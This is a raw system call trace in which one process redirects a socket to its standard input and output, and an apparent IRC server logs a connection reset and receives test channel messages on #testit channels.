5780  07:10:39.492857 dup(8)            = 6
5780  07:10:39.492870 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7be8) = -1 EINVAL (Invalid argument)
5780  07:10:39.492882 _llseek(6, 0, 0xbfbb7c30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.492892 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5780  07:10:39.492912 dup2(6, 1)        = 1
5780  07:10:39.492924 close(6)          = 0
5780  07:10:39.492935 fcntl64(1, F_SETFD, 0) = 0
5780  07:10:39.492945 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7bb8) = -1 EINVAL (Invalid argument)
5780  07:10:39.492956 _llseek(1, 0, 0xbfbb7c00, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.492985 dup(8)            = 6
5780  07:10:39.492997 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7be8) = -1 EINVAL (Invalid argument)
5780  07:10:39.493008 _llseek(6, 0, 0xbfbb7c30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.493018 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5780  07:10:39.493034 dup2(6, 0)        = 0
5780  07:10:39.493044 close(6)          = 0
5780  07:10:39.493054 fcntl64(0, F_SETFD, 0) = 0
5780  07:10:39.493067 fcntl64(0, F_SETFD, 0) = 0
5780  07:10:39.493083 read(0,  <unfinished ...>
4519  07:10:39.505850 <... select resumed> ) = 1 (in [5], left {0, 700000})
4519  07:10:39.505850 clock_gettime(CLOCK_MONOTONIC, {1049, 322859634}) = 0
4519  07:10:39.505851 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:10:39.505851 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:10:39.505851 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:10:39.505855 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:10:39.505893 close(5)          = 0
4519  07:10:39.505910 gettimeofday({1495624239, 505914}, NULL) = 0
4519  07:10:39.505922 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 760000})
4519  07:10:39.746011 clock_gettime(CLOCK_MONOTONIC, {1049, 563019692}) = 0
4519  07:10:39.746011 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:10:39.746011 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746011 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746011 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746012 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746012 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746012 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746012 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746021 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746035 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746049 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746062 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746075 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746088 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746102 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746115 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746129 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746149 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746177 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746217 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746249 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746295 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746309 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.746326 time(NULL)        = 1495624239
4519  07:10:39.746337 time(NULL)        = 1495624239
4519  07:10:39.746348 gettimeofday({1495624239, 746352}, NULL) = 0
4519  07:10:39.746359 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:39.746388 clock_gettime(CLOCK_MONOTONIC, {1049, 563400650}) = 0
4519  07:10:39.746398 gettimeofday({1495624239, 746401}, NULL) = 0
4519  07:10:39.746408 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 860000})
4519  07:10:39.885845 clock_gettime(CLOCK_MONOTONIC, {1049, 702864942}) = 0
4519  07:10:39.885866 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:10:39.885890 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885907 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885922 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885936 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885949 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885963 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885976 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.885990 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886003 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886016 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886029 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886043 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886056 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886069 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886082 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886095 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886109 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886122 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886135 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886149 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886162 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886176 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.886281 gettimeofday({1495624239, 886286}, NULL) = 0
4519  07:10:39.886324 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 930000})
4519  07:10:39.955851 clock_gettime(CLOCK_MONOTONIC, {1049, 772868831}) = 0
4519  07:10:39.955869 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:10:39.955889 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955907 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955921 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955934 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955948 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955969 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955982 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.955996 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956009 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956023 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956036 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956049 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956062 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956075 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956089 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956102 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956115 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956128 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956142 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956155 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956169 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956182 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.956197 time(NULL)        = 1495624239
4519  07:10:39.956217 time(NULL)        = 1495624239
4519  07:10:39.956258 gettimeofday({1495624239, 956261}, NULL) = 0
4519  07:10:39.956270 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:39.956332 clock_gettime(CLOCK_MONOTONIC, {1049, 773344684}) = 0
4519  07:10:39.956342 gettimeofday({1495624239, 956345}, NULL) = 0
4519  07:10:39.956352 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
5780  07:10:40.024068 <... read resumed> "", 4096) = 0
5780  07:10:40.024260 close(8)          = 0
5780  07:10:40.024412 exit_group(0)     = ?
